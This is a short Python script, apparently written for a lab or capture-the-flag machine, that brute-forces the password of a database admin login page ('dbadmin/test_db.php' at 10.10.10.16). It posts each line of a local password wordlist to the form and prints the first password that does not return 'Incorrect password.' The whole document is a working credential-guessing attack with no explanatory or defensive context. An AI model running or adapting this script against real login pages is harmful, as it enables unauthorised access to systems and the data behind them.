import csv

import requests
import re

url = "http://10.10.10.16/dbadmin/test_db.php"

error = "Incorrect password."
file = "C:\\Users\\pduck\\Desktop\\document\\password\\38650-password-sktorrent.txt"
f = open(file, 'r')
# print(f)
for line in f:
    data = {
        "password": line.strip(),
        "remember": "yes",
        "login": "Log+In",
        "proc_login": "true"
    }
    # d = csv.reader(f)
    print(data)
    response = requests.post(url, data=data)
    flag = re.search(error, response.text)
    if flag is None:
        print(line)
        exit(0)
f.close()
